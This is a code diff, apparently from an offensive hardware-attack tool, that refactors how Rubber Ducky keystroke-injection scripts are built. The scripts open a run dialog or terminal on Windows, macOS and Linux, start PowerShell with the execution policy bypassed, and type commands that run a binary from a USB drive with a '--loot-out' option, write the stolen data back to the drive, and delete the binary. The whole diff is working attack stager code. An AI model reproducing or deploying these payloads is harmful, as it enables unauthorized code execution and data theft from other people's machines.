@@ -81,8 +81,12 @@ def _clear_staged_binaries(*, keep: str = '') -> None:
             pass
 
 
+def _ducky_script(*lines: str) -> str:
+    return ''.join(line + '\n' for line in lines)
+
+
 def _ducky_type_line(line: str) -> str:
-    return 'STRING ' + line + '\nENTER\n'
+    return _ducky_script('STRING ' + line, 'ENTER')
 
 
 class _BinaryMixin:
@@ -114,10 +118,15 @@ class _BinaryMixin:
                 "if($?){& $x --loot-out (Join-Path $d.Root '" + _USB_LOOT_FILE + "')};"
                 'del $x -ea 0;break}}'
             )
-            return (
-                'DELAY 700\nGUI r\nDELAY 700\n'
-                'STRING powershell -NoProfile -ExecutionPolicy Bypass\nENTER\n'
-                'DELAY 1800\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
+            return _ducky_script(
+                'DELAY 700',
+                'GUI r',
+                'DELAY 700',
+                'STRING powershell -NoProfile -ExecutionPolicy Bypass',
+                'ENTER',
+                'DELAY 1800',
+                'DEFAULTCHARDELAY 10',
+                _ducky_type_line(cmd),
             )
 
         if target_os == 'macos':
@@ -128,9 +137,14 @@ class _BinaryMixin:
                 '&&/tmp/pa --loot-out "$d/' + _USB_LOOT_FILE + '"'
                 ';rm -f /tmp/pa;break;fi;done'
             )
-            return (
-                'DELAY 700\nGUI SPACE\nDELAY 1000\nSTRING Terminal\nENTER\n'
-                'DELAY 2000\n' + _ducky_type_line(cmd)
+            return _ducky_script(
+                'DELAY 700',
+                'GUI SPACE',
+                'DELAY 1000',
+                'STRING Terminal',
+                'ENTER',
+                'DELAY 2000',
+                _ducky_type_line(cmd),
             )
 
         cmd = (
@@ -141,7 +155,12 @@ class _BinaryMixin:
             '&&/tmp/pa --loot-out "$d/' + _USB_LOOT_FILE + '"'
             ';rm -f /tmp/pa;break;fi;done'
         )
-        return 'DELAY 700\nCTRL-ALT t\nDELAY 2000\n' + _ducky_type_line(cmd)
+        return _ducky_script(
+            'DELAY 700',
+            'CTRL-ALT t',
+            'DELAY 2000',
+            _ducky_type_line(cmd),
+        )
 
     def _stager_script(self, target_os: str) -> str:
         return self._usb_drive_stager_script(target_os)
